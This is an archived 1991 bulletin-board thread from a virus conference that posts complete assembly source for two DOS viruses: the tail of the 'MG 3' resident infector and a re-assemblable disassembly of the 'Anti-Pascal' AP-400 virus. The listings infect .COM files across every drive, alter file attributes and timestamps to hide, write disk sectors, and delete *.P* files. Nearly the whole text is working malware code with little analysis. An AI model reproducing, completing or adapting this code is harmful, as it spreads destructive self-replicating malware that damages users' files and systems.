         mov   ah,04eh
         mov   dx,offset file
         mov   cx,3               ; r/o , hidden
         int   0ffh               ; int   21h
         jc    lst

next:    test  ss:[bx+21],byte ptr 80h
         jz    true
nxt:     mov   ah,4fh             ; find next
         int   0ffh
         jnc   next
lst:     jmp   last

true:    cmp   ss:[bx+27],byte ptr 0fdh
         ja    nxt
         mov   [144],offset i24pr
         mov   [146],cs

         les   ax,[4ch]           ; int 13h
         mov   i13adr,ax
         mov   i13adr+2,es
         jmp   short $
beg:     mov   [4ch],offset i13pr
         mov   [4eh],cs

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:07)             Number: 3560
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: MG 3               <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
         ;
not3_3:  push  ss
         pop   ds
         push  [bx+22]            ; time +
         push  [bx+24]            ; date +
         push  [bx+21]            ; attrib +
         lea   dx,[bx+30]         ; ds : dx = offset file name
         mov   ax,4301h           ; Change attrib !!!
         pop   cx
         and   cx,0feh            ; clear r/o and CH
         or    cl,0c0h            ; set Infect. attr
         int   0ffh

         mov   ax,03d02h          ; open
         int   0ffh               ; int   21h
         xchg  ax,bx

         push  cs
         pop   ds

         mov   ah,03fh
         mov   cx,3
         mov   dx,offset first
         int   0ffh

         mov   ax,04202h          ; move fp to EOF
         xor   dx,dx
         mov   cx,dx
         int   0ffh
         mov   word ptr cal_ofs+1,ax

         mov   ah,040h
         mov   cx,len
         mov   dx,ofs
         int   0ffh
         jc    not_inf

         mov   ax,04200h
         xor   dx,dx
         mov   cx,dx
         int   0ffh

         mov   ah,040h
         mov   cx,3
         mov   dx,offset cal_ofs
         int   0ffh

not_inf: mov   ax,05701h
         pop   dx                 ; date
         pop   cx                 ; time
         int   0ffh

         mov   ah,03eh            ; close
         int   0ffh

         les   ax,dword ptr i13adr
         mov   [4ch],ax           ; int 13h
         mov   [4eh],es

last:    add   sp,46
         pop   dx
         pop   ds                 ; restore DTA
         mov   ah,1ah
         int   0ffh

rest:    pop   dx                 ; restore current drive
         mov   ah,0eh             ;
         int   0ffh               ;

         pop   es
         pop   bx
         pop   cx
         pop   ds
         pop   dx
         pop   ax

i21cl:   iret                     ; Return from INT FC

i24pr:   mov   al,3               ; Critical errors
         iret

i13pr:   cmp   ah,3
         jne   no
         inc   byte ptr cs:activ
         dec   ah
no:      jmp   dword ptr cs:i13adr

pr7b4:         db    2eh,0d0h,2eh
               dw    offset activ
;        shr   cs:activ,1
         jnc   ex7b0
         inc   ah
ex7b0:   jmp   dword ptr cs:[7b0h]

;--------

file:    db    "*",32,".COM"

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:07)             Number: 3561
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: MG 3               <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------

activ:   db    0

         dw    offset i21pr      ; int 0fch
         dw    0

cal_ofs: db    0e8h

end:
         dw    ?                  ; cal_ofs

i13adr:  dw    ?
         dw    ?


; The End.---

 * Origin: ESaSS / Thunderbyte support, The Netherlands (2:280/200)

---
 þ RonMail 1.0 þ Programmer's Inn - Home of FeatherNet (619)-446-4506
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:08)             Number: 3562
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: ANTI PASCAL                    Conf: (16) VIRUS     
---------------------------------------------------------------------------
        page        ,132
        name        AP400
        title        The 'Anti-Pascal' virus, version AP-400
        .radix        16

;
......................................................................
......
; .  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5,
ap. 51 .
; .  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255
.
; .
.
; .                       The 'Anti-Pascal' Virus, version AP-400
.
; .                    Disassembled by Vesselin Bontchev, July 1990
.
; .
.
; .                     Copyright (c) Vesselin Bontchev 1989, 1990
.
; .
.
; .         This listing is only to be made available to virus
researchers      .
; .                   or software writers on a need-to-know basis.
.
;
......................................................................
......

; The disassembly has been tested by re-assembly using MASM 5.0.

code        segment
        assume        cs:code, ds:code

        org        100

v_const =        2042d

start:
        jmp        v_entry
        db        0CA                ; Virus signature

        db        (2048d - 9) dup (90)        ; The original "program"

        mov        ax,4C00         ; Just exit
        int        21

v_start label        byte
first4        db        0E9, 0F8, 7, 90
allcom        db        '*.COM', 0

mydta        label        byte
reserve db        15 dup (?)
attrib        db        ?
time        dw        ?
date        dw        ?
fsize        dd        ?
namez        db        14d dup (?)

allp        db        0, '?????????A?'
maxdrv        db        ?
sign        db        'PAD'

v_entry:
        push        ax                ; Save AX & DX
        push        dx

        mov        ah,19                ; Get the default drive
        int        21
        push        ax                ; Save it on stack
        mov        ah,0E                ; Set it as default (?!)
        mov        dl,al
        int        21                ; Do it

        call        self                ; Determine the virus' start
address
self:
        pop        si
        sub        si,offset self-v_const

; Save the number of logical drives in the system:

        mov        byte ptr [si+offset maxdrv-v_const],al

; Restore the first 4 bytes of the infected program:

        mov        ax,[si+offset first4-v_const]
        mov        word ptr ds:[offset start],ax
        mov        ax,[si+offset first4+2-v_const]
        mov        word ptr ds:[offset start+2],ax

        mov        ah,1A                ; Set new DTA
        lea        dx,[si+offset mydta-v_const]
        int        21                ; Do it
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:08)             Number: 3563
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: ANTI PASCAL        <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
        pop        ax                ; Restore current drive in AL
        push        ax                ; Keep it on stack

        call        inf_drive        ; Proceed with the current drive

        xor        al,al                ; For all logical drives in
the system
drv_lp:
        call        inf_drive        ; Proceed with drive
        jbe        drv_lp                ; Loop until no more drives

        pop        ax                ; Restore the saved current drive
        mov        ah,0E                ; Set it as current drive
        mov        dl,al
        int        21                ; Do it

        mov        dx,80                ; Restore original DTA
        mov        ah,1A
        int        21                ; Do it

        mov        si,offset start
        pop        dx                ; Restore DX & AX
        pop        ax
        jmp        si                ; Run the original program

inf_drive:
        push        ax                ; Save the selected drive number
on stack
        mov        ah,0E                ; Select that drive
        mov        dl,al
        int        21                ; Do ti
        pop        ax                ; Restore AX

        push        ax                ; Save the registers used
        push        bx
        push        cx
        push        si                ; Save SI

        mov        cx,1                ; Read sector #50 of the drive
specified
        mov        dx,50d
        lea        bx,[si+offset v_end-v_const]
        push        ax                ; Save AX
        push        bx                ; Save BX, CX & DX also
        push        cx
        push        dx
        int        25                ; Do read
        pop        dx                ; Clear the stack
        pop        dx                ; Restore saved DX, CX & BX
        pop        cx
        pop        bx
        jnc        wr_drive        ; Write the information back if no
error

        pop        ax                ; Restore AX
        pop        si                ; Restore SI

drv_xit:
        pop        cx                ; Restore used registers
        pop        bx
        pop        ax

        inc        al                ; Go to next drive number
        cmp        al,[si+offset maxdrv-v_const]        ; See if there
are more drives
xit:
        ret                        ; Exit

wr_drive:
        pop        ax                ; Restore drive number in AL
        int        26                ; Do write
        pop        ax                ; Clear the stack
        pop        si                ; Restore Si
        jnc        cont                ; Continue if no error
        clc
        jmp        drv_xit         ; Otherwise exit

; Find first COM file on the current directory of the selected drive:

cont:
        mov        ah,4E
        xor        cx,cx                ; Normal files only
        lea        dx,[si+offset allcom-v_const]        ; File mask
next:
        int        21                ; Do find
        jc        no_more         ; Quit search if no more such files
        lea        dx,[si+offset namez-v_const]        ; Get file name
found
        call        infect                ; Infect that file
        mov        ah,4F                ; Prepare for FindNext
        jc        next                ; If infection not successful,
go to next file
        jmp        drv_xit         ; Otherwise quit

no_more:
        mov        ah,13                ; Delete all *.P* files in
that dir

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:08)             Number: 3564
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: ANTI PASCAL        <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
        lea        dx,[si+offset allp-v_const]
        int        21                ; Do it
        clc
        jmp        drv_xit         ; Done. Exit

namaddr dw        ?                ; Address of the file name buffer

infect:
        mov        [si+offset namaddr-v_const],dx        ; Save file
name address

        mov        ax,4301         ; Reset all file attributes
        xor        cx,cx
        int        21                ; Do it
        jc        xit                ; Exit on error

        mov        ax,3D02         ; Open file for both reading and
writing
        int        21
        jc        xit                ; Exit on arror
        mov        bx,ax                ; Save file handle in BX

        mov        cx,4                ; Read the first 4 bytes of the
file
        mov        ah,3F
        lea        di,[si+offset first4-v_const]        ; Save them in
first4
        mov        dx,di
        int        21                ; Do it
        jc        quit                ; Exit on error

        cmp        byte ptr [di+3],0CA        ; File already infected?
        stc                        ; Set CF to indicate it
        jz        quit                ; Don't touch this file if so

        mov        cx,[si+offset fsize-v_const]
        cmp        cx,2048d        ; Check if file size >= 2048 bytes
        jb        quit                ; Exit if not
        cmp        cx,64000d        ; Check if file size <= 64000
bytes
        stc                        ; Set CF to indicate it
        ja        quit                ; Exit if not

        xor        cx,cx                ; Seek to file end
        xor        dx,dx
        mov        ax,4202
        int        21                ; Do it
        push        ax                ; Save file size on stack
        jc        quit                ; Exit on error

; Write the virus body after the end of file:

        mov        cx,v_end-v_start
        nop
        lea        dx,[si+offset v_start-v_const]
        mov        ah,40
        int        21                ; Do it
        jc        quit                ; Exit on error
        pop        ax                ; Restore file size in AX

; Form a new address for the first JMP instruction in AX:

        add        ax,v_entry-v_start-3
        mov        byte ptr [di],0E9        ; JMP opcode
        mov        [di+1],ax
        mov        byte ptr [di+3],0CA        ; Set the "file
infected" sign

        xor        cx,cx                ; Seek to file beginning
        xor        dx,dx
        mov        ax,4200
        int        21                ; Do it
        jc        quit                ; Exit on error

        mov        cx,4                ; Write the new first 4 bytes
of the file
        mov        dx,di
        mov        ah,40
        int        21                ; Do it

quit:
        pushf                        ; Save flags

        mov        ax,5701         ; Set file date & time
        mov        cx,[si+offset time-v_const]        ; Get time from
mydta
        mov        dx,[si+offset date-v_const]        ; Get date from
mydta
        int        21                ; Do it

        mov        ah,3E                ; Close the file
        int        21

        mov        ax,4301         ; Set file attributes
        mov        cl,[si+offset attrib-v_const]        ; Get them
from mydta
        xor        ch,ch

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:08)             Number: 3565
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: ANTI PASCAL        <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
        mov        dx,[si+offset namaddr-v_const]        ; Point to
file name
        int        21                ; Do it

        popf                        ; Restore flags
        ret

v_end        equ        $

code        ends
        end        start

---
 þ RonMail 1.0 þ Programmer's Inn - Home of FeatherNet (619)-446-4506
